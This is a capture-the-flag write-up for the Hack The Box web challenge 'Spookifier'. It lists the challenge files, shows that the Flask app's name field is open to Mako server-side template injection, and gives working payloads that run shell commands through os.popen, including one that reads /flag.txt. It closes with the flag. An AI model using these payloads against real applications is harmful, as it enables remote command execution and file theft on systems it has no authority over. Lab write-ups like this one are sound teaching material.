# Spookifier

- **Category:** Web
- **Points:** 0
- **Difficulty:** Very Easy

[Spookifier](https://app.hackthebox.com/challenges/Spookifier)

## Description

There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?

## Attachments

.zip file containing the following:

```bash
$ tree
.
├── Dockerfile
├── build-docker.sh
├── challenge
│   ├── application
│   │   ├── __pycache__
│   │   │   └── main.cpython-313.pyc
│   │   ├── blueprints
│   │   │   └── routes.py
│   │   ├── main.py
│   │   ├── static
│   │   │   ├── css
│   │   │   │   ├── index.css
│   │   │   │   └── nes.css
│   │   │   └── images
│   │   │       └── vamp.png
│   │   ├── templates
│   │   │   └── index.html
│   │   └── util.py
│   └── run.py
├── config
│   └── supervisord.conf
└── flag.txt

10 directories, 13 files
```

## Solution

The challenge is a web application that generates a spooky name for you. The application is written in Python and uses Flask as the web framework. The application is running in a Docker container.
Let's test if the application is vulnerable to template injection. We can do this by sending a request to the application with the following payload:

> Write it in the name field and click on the "Spookify" button.

```python
${7*7}
```

> The application is vulnerable to template injection ! It returns 49.

From the source code, we can see that the application is using the `Mako` template engine. The `Mako` template engine is vulnerable to template injection. 
We can found examples [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#mako)

```python
import os
x=os.popen('id').read()
${x}
```

> Now, let's try to read the flag file. We can do this by sending a request to the application with the following payload:

```python
${self.module.cache.util.os.popen("cat /flag.txt").read()}
```

## Flag

`HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}`

